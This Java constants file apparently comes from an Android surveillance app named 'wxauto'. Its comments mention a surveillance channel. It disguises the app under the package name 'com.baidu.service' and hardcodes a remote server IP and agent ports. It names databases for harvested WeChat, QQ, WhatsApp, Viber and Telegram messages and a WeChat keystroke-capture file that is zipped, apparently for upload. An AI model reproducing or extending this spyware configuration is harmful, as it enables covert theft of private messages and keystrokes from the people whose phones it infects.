package com.far.wxauto;

/**
 * Created by Administrator on 2016/11/17.
 */
public class UrlConstants {
    //IS_RELEASE      是否是正式版本   正式版需置为true
    //IS_TCP_ENCRYPT  是否需要加密
    public static final boolean IS_RELEASE = false;
    public static final boolean IS_TCP_ENCRYPT = true;
    public static final String BASE_ST_PORT = "61613";
    public static final String AGENT_PORT = "15999";
    public static final String PKG_NAME = "com.baidu.service";

    //wifi临侦渠道
    public static final String URL = "https://149.28.21.203";
    public static final String CHANNEL_WIFI = "test";


    public static final String MSG_SPLIT = "$#%#$";
    public static final String MSG_DB_WX = "msg_wx.db";
    public static final String MSG_DB_QQ = "msg_qq.db";
    public static final String MSG_DB_WA = "msg_whatsapp.db";
    public static final String MSG_DB_VIBER = "msg_viber.db";
    public static final String MSG_DB_TELE = "msg_telegram.db";


    public static final String WECHAT = "wechat";
    public static final String WECHAT_SP = "keyboard_wechat";
    public static final String CAPTURE_KEY_FILE_WECHAT = "keyboard_wechat.dat";
    public static final String CAPTURE_KEY_FILE_WECHAT_ZIP = "keyboard_wechat.zip";
    public static final String PKG_WX = "com.tencent.mm";
}